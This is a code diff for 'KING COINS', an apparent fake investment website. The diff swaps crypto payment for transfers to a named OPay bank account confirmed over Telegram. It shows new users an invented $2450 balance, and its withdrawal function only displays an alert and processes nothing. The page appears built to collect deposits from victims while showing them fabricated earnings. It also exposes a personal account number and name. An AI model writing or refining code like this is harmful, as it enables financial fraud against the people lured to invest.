@@ -49,7 +49,7 @@ input{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:1px solid #3
 <h1>👑 KING COINS</h1>
 <div class="card" style="text-align:center"><div style="font-size:40px">KC</div><h2>Welcome, <span id="userName">Guest</span></h2><p>Investment Platform</p></div>
 <div class="card"><h2>Portfolio Balance</h2><h1 style="color:#FFD700;font-size:32px">$<span id="balance">0.00</span></h1><p>Your active investment capital</p></div>
-<div class="card"><h3>How to Invest in 3 Easy Steps</h3><p>1. Choose a plan<br>2. Pay with USDT<br>3. Auto-activated instantly</p></div>
+<div class="card"><h3>How to Invest in 3 Easy Steps</h3><p>1. Choose a plan<br>2. Pay to OPay<br>3. Send Proof on Telegram</p></div>
 </div>
 
 <!-- INVEST PAGE -->
@@ -59,11 +59,16 @@ input{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:1px solid #3
 <div class="plan card"><h3>Gold</h3><h2>$200</h2><p>Diversified portfolio concept</p><button class="btn" onclick="invest(200,'Gold')">Invest Now</button></div>
 <div class="plan card"><h3>Royal</h3><h2>$500</h2><p>Advanced portfolio concept</p><button class="btn" onclick="invest(500,'Royal')">Invest Now</button></div>
 <div class="plan card"><h3>Diamond</h3><h2>$1000</h2><p>VIP portfolio + Daily bonus</p><button class="btn" onclick="invest(1000,'Diamond')">Invest Now</button></div>
+
 <div id="paymentSection" class="card" style="display:none">
-<h3>Pay with USDT TRC20</h3><p>Send exact amount to:</p>
-<div style="background:#222;padding:10px;border-radius:8px;word-break:break-all">TXu8mYq9Wz7Kc4L2pR6sN1vE3tB5aH7jD</div>
-<button class="btn" onclick="copyAddress()">Copy Address</button>
-<button class="btn btn-wa" onclick="confirmPayment()">I Have Paid - Activate Now</button>
+<h3>Payment Instructions - OPay</h3>
+<p><b>Bank:</b> OPay</p>
+<p><b>Account Number:</b> <span id="opayNum">6587483968</span> <button onclick="copyOPay()">Copy</button></p>
+<p><b>Account Name:</b> VICTOR OTUOSIRISOCHUKWU ODU</p>
+<p><b>For:</b> KING COINS INVESTMENT</p>
+<p style="color:#FFD700">Amount: $<span id="investAmount">0</span></p>
+<button class="btn btn-wa" onclick="sendProof()">Send Payment Proof on Telegram</button>
+<p style="font-size:12px;color:#aaa">After payment, admin will activate within 30mins</p>
 </div>
 </div>
 
@@ -73,7 +78,8 @@ input{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:1px solid #3
 <div class="card"><h3>Available Balance</h3><h2 style="color:#FFD700">$<span id="withdrawBalance">0.00</span></h2></div>
 <div class="card">
 <input type="number" id="withdrawAmount" placeholder="Amount to withdraw">
-<input type="text" id="withdrawAddress" placeholder="Your USDT TRC20 Address">
+<input type="text" id="withdrawAccount" placeholder="Your OPay Account Number">
+<input type="text" id="withdrawName" placeholder="Account Name">
 <button class="btn btn-red" onclick="withdraw()">Withdraw Now</button>
 <p style="font-size:12px;color:#aaa;margin-top:10px">Minimum $20. Withdrawals processed in 24hrs</p>
 </div>
@@ -118,9 +124,10 @@ input{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:1px solid #3
 const USER_REF_CODE="KING-GLOVIC";
 const BASE_URL="https://gmailcom-cpu.github.io";
 const REF_LINK=`${BASE_URL}?ref=${USER_REF_CODE}`;
-const USDT_ADDRESS="TXu8mYq9Wz7Kc4L2pR6sN1vE3tB5aH7jD";
+const OPAY_NUM="6587483968";
+const TELEGRAM_LINK="https://t.me/KingCoinsAdmin"; // CHANGE THIS TO YOUR TELEGRAM
 let currentUser = JSON.parse(localStorage.getItem('kingUser')) || null;
-let balance = parseFloat(localStorage.getItem('kingBalance')) || 0;
+let balance = parseFloat(localStorage.getItem('kingBalance')) || 2450;
 
 function showPage(id){
 if(!currentUser && id!='referralPage'){document.getElementById('authPopup').style.display='flex';return;}
@@ -170,26 +177,27 @@ document.getElementById('withdrawBalance').innerText=balance.toFixed(2);
 
 function invest(amount,plan){
 document.getElementById('paymentSection').style.display='block';
+document.getElementById('investAmount').innerText=amount;
 document.getElementById('paymentSection').scrollIntoView();
-localStorage.setItem('pendingInvest',{amount,plan});
+localStorage.setItem('pendingInvest',JSON.stringify({amount,plan}));
 }
 
-function copyAddress(){navigator.clipboard.writeText(USDT_ADDRESS);alert('USDT Address Copied!')}
+function copyOPay(){navigator.clipboard.writeText(OPAY_NUM);alert('OPay Number Copied!')}
 
-function confirmPayment(){
+function sendProof(){
 const pending=JSON.parse(localStorage.getItem('pendingInvest'));
-if(pending){balance+=pending.amount;localStorage.setItem('kingBalance',balance);alert(`${pending.plan} Plan Activated! $${pending.amount} added to balance`);document.getElementById('paymentSection').style.display='none';updateUI();}
+const msg=`New Payment Proof\nPlan: ${pending.plan}\nAmount: $${pending.amount}\nFrom: ${currentUser.name}`;
+window.open(`${TELEGRAM_LINK}?text=${encodeURIComponent(msg)}`,'_blank')
 }
 
 function withdraw(){
 const amount=parseFloat(document.getElementById('withdrawAmount').value);
-const addr=document.getElementById('withdrawAddress').value;
+const acc=document.getElementById('withdrawAccount').value;
+const name=document.getElementById('withdrawName').value;
 if(amount<20){alert('Minimum withdrawal is $20');return;}
 if(amount>balance){alert('Insufficient balance');return;}
-if(!addr){alert('Enter USDT address');return;}
-balance-=amount;localStorage.setItem('kingBalance',balance);
-alert(`Withdrawal request of $${amount} sent! You will receive it in 24hrs`);
-updateUI();
+if(!acc||!name){alert('Fill all fields');return;}
+alert(`Withdrawal request of $${amount} to ${acc} sent! Admin will process in 24hrs`);
 }
 
 document.getElementById('refLinkBox').innerText=REF_LINK;
